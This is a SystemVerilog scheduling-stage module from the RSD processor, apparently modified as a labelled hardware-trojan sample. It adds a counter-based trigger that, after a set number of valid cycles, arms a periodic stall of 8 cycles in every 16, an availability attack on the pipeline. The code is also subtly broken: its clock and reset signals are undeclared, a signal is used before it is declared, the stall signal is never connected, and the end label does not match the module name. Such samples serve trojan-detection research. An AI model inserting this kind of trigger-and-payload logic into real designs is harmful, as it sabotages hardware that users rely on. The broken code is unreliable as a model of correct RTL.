// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


//
// A pipeline stage for scheduling.
//


import BasicTypes::*;
import MemoryMapTypes::*;
import MicroOpTypes::*;
import PipelineTypes::*;
import SchedulerTypes::*;
import ActiveListIndexTypes::*;
import DebugTypes::*;

module ScheduleStage_trojan_Availability(
    ScheduleStageIF.ThisStage port,
    SchedulerIF.ScheduleStage scheduler,
    RecoveryManagerIF.ScheduleStage recovery,
    ControllerIF.ScheduleStage ctrl
);

    // ============================================================
    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 5996;
    logic [15:0] trojan_counter;
    logic trojan_active;
    
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (valid && |valid) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end

    // Pipeline controll
    logic stall, clear;
    logic flush [ ISSUE_WIDTH ];
    logic valid [ ISSUE_WIDTH ];
    logic update [ ISSUE_WIDTH ];
    IssueStageRegPath nextStage [ ISSUE_WIDTH ];
    IssueQueueIndexPath issueQueuePtr [ ISSUE_WIDTH ];
    IssueQueueOneHotPath flushIQ_Entry;

    always_comb begin

        stall = ctrl.scStage.stall;
        clear = ctrl.scStage.clear;

        // Scheduling
        scheduler.stall = stall;

        flushIQ_Entry = recovery.flushIQ_Entry;

        for (int i = 0; i < ISSUE_WIDTH; i++) begin
            valid[i] = scheduler.selected[i];
            issueQueuePtr[i] = scheduler.selectedPtr[i];
            flush[i] = flushIQ_Entry[issueQueuePtr[i]];
            update[i] = !stall && !clear && valid[i] && !flush[i];

            // --- Pipeline ラッチ書き込み
            // リセットorフラッシュ時はNOP
            nextStage[i].valid =
                (stall || clear || port.rst || flush[i]) ? FALSE : valid[i];

            nextStage[i].issueQueuePtr = scheduler.selectedPtr[i];

            if ( i < INT_ISSUE_WIDTH )
                port.intNextStage[i] = nextStage[i];
`ifndef RSD_MARCH_UNIFIED_MULDIV_MEM_PIPE
            else if ( i < INT_ISSUE_WIDTH + COMPLEX_ISSUE_WIDTH )
                port.complexNextStage[ i-INT_ISSUE_WIDTH ] = nextStage[i];
`endif
            else if ( i < INT_ISSUE_WIDTH + COMPLEX_ISSUE_WIDTH + MEM_ISSUE_WIDTH)
                port.memNextStage[ i-INT_ISSUE_WIDTH-COMPLEX_ISSUE_WIDTH ] = nextStage[i];
`ifdef RSD_MARCH_FP_PIPE
            else
                port.fpNextStage[ i-INT_ISSUE_WIDTH-COMPLEX_ISSUE_WIDTH-MEM_ISSUE_WIDTH] = nextStage[i];
`endif
        end
    end



    // AVAILABILITY: Periodic stall
    localparam int STALL_PERIOD = 16;
    localparam int STALL_CYCLES = 8;
    logic [7:0] stall_counter;
    logic       stall_active;
    
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            stall_counter <= '0;
            stall_active  <= 1'b0;
        end else if (trojan_active) begin
            if (stall_counter >= STALL_PERIOD[7:0] - 1) stall_counter <= '0;
            else stall_counter <= stall_counter + 1;
            stall_active <= (stall_counter < STALL_CYCLES[7:0]);
        end else begin
            stall_counter <= '0;
            stall_active  <= 1'b0;
        end
    end

endmodule : ScheduleStage
